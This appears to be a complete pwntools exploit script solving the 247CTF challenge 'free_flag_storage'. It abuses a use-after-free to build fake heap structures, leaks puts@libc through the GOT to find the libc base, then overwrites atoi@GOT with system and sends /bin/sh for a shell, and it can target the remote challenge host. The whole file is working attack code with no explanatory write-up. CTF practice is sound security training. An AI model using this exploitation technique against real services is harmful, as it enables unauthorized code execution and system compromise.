#!/usr/bin/env python3
"""
UAF Exploit - Final version for free_flag_storage
247CTF Challenge
"""
from pwn import *

context.binary = elf = ELF('./free_flag_storage')
context.log_level = 'info'

puts_got = 0x804b028
atoi_got = 0x804b034

# Local libc offsets
libc_local = ELF('/lib/i386-linux-gnu/libc.so.6', checksec=False)
puts_offset = libc_local.symbols['puts']
system_offset = libc_local.symbols['system']

log.info(f"Local offsets: puts={hex(puts_offset)}, system={hex(system_offset)}")

def start():
    if args.REMOTE:
        return remote('de22d451a7a11cba.247ctf.com', 50413)
    return process('./free_flag_storage')

p = start()

def send3(s):
    p.send(str(s).encode().ljust(3, b'\n'))

def add(length, value, cid, score):
    p.sendline(b'add')
    p.recvuntil(b'length:'); send3(length)
    p.recvuntil(b'value:'); p.send(value.ljust(length, b'\x00')[:length])
    p.recvuntil(b'challenge_id:'); send3(cid)
    p.recvuntil(b'score:'); send3(score)
    p.recvuntil(b'Enter command:')

def edit_trigger_shell(idx, value, length, system_addr):
    """Special edit that triggers shell via atoi->system overwrite"""
    p.sendline(b'edit')
    p.recvuntil(b'edit:'); send3(idx)
    p.recvuntil(b'):'); p.send(value.ljust(length, b'\x00')[:length])
    # After this, atoi@GOT = system
    # The next read (challenge_id) will call system on our input!
    p.recvuntil(b'challenge_id:')
    log.info("GOT overwritten! Sending /bin/sh as cid to trigger shell")
    p.sendline(b'/bin/sh')
    # This should spawn a shell!

def edit(idx, value, length, cid=99, score=99):
    p.sendline(b'edit')
    p.recvuntil(b'edit:'); send3(idx)
    p.recvuntil(b'):'); p.send(value.ljust(length, b'\x00')[:length])
    p.recvuntil(b'challenge_id:'); send3(cid)
    p.recvuntil(b'score:'); send3(score)
    p.recvuntil(b'Enter command:')

def delete(idx):
    p.sendline(b'delete')
    p.recvuntil(b'delete:'); send3(idx)
    p.recvuntil(b'Enter command:')

def show():
    p.sendline(b'print')
    return p.recvuntil(b'Enter command:', drop=True)

p.recvuntil(b'Enter command:')

# === STAGE 1: Setup heap overlap ===
log.info("=== STAGE 1: Create heap overlap ===")
add(8, b'AAAAAAAA', 1, 11)
add(8, b'BBBBBBBB', 2, 22)
add(8, b'CCCCCCCC', 3, 33)

delete(0)
delete(1)

# Fake struct for leak
fake_struct_leak = p32(4) + p32(puts_got) + p32(0xcafe) + p32(0xbabe)
add(16, fake_struct_leak, 4, 44)

# === STAGE 2: Leak libc ===
log.info("=== STAGE 2: Leak libc ===")
data = show()

puts_libc = None
for line in data.split(b'\n'):
    if b'51966' in line:  # 0xcafe = 51966
        start = line.find(b'{')
        end = line.find(b'}')
        if start != -1 and end != -1:
            content = line[start+1:end]
            if len(content) >= 4:
                puts_libc = u32(content[:4])
                log.success(f"Leaked puts@libc: {hex(puts_libc)}")
                break

if puts_libc is None:
    log.error("Leak failed!")
    p.interactive()

libc_base = puts_libc - puts_offset
system_addr = libc_base + system_offset
log.info(f"libc base: {hex(libc_base)}, system: {hex(system_addr)}")

# === STAGE 3: Overwrite fake struct to point to atoi@GOT ===
log.info("=== STAGE 3: Update fake struct -> atoi@GOT ===")
fake_struct_write = p32(4) + p32(atoi_got) + p32(0xdead) + p32(0xbeef)
edit(1, fake_struct_write, 16)

# === STAGE 4: Overwrite atoi@GOT and trigger shell ===
log.info("=== STAGE 4: Overwrite atoi@GOT with system ===")
edit_trigger_shell(0, p32(system_addr), 4, system_addr)

log.success("Shell spawned!")
p.interactive()
